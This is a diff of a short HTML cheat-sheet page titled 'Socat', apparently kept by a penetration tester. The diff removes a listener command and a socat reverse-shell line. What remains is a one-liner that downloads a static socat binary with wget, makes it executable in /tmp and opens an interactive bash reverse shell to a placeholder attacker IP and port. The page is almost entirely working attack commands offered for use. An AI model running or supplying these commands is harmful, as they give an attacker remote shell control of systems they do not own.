@@ -3,13 +3,7 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Socat</title>
-</head><body>Client listen:<br/>
-socat file:`tty`,raw,echo=0 tcp-listen:4444 <br/>
-<br/>
-Server open port and reverse connect:<br/>
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 <br/>
-<br/>
-Can download static binaries if socat isn't installed. Checkout: <a href="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a>&nbsp; <br/>
+</head><body>Can download static binaries if socat isn't installed. Checkout: <a href="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a>&nbsp; <br/>
 <br/>
 Server reverse without socat installed:<br/>
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&lt;YOUR IP&gt;:&lt;YOUR PORT&gt;</body></html>
